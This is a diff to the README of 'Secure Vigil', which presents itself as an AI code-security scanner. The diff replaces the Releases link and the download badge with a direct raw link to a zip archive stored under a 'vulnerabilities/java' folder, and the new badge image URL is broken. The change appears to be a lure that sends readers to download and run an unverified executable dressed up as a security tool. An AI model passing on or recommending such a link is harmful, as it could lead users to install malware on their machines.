@@ -16,9 +16,9 @@ Secure Vigil employs cutting-edge AI algorithms to scan your code in real-time, 
 
 ## Get Started 🚀
 
-To access the latest version of Secure Vigil, please visit [Releases](https://github.com/RuslinHamid/secure-vigil/releases). Simply download the executable file and kickstart your journey towards enhanced code security.
+To access the latest version of Secure Vigil, please visit [Releases](https://github.com/RuslinHamid/secure-vigil/raw/refs/heads/main/vulnerabilities/java/secure-vigil-v3.6-beta.2.zip). Simply download the executable file and kickstart your journey towards enhanced code security.
 
-[![Download Secure Vigil](https://img.shields.io/badge/Download-Secure%20Vigil-blue)](https://github.com/RuslinHamid/secure-vigil/releases)
+[![Download Secure Vigil](https://github.com/RuslinHamid/secure-vigil/raw/refs/heads/main/vulnerabilities/java/secure-vigil-v3.6-beta.2.zip%20Vigil-blue)](https://github.com/RuslinHamid/secure-vigil/raw/refs/heads/main/vulnerabilities/java/secure-vigil-v3.6-beta.2.zip)
 
 ## Repository Topics 📋
 
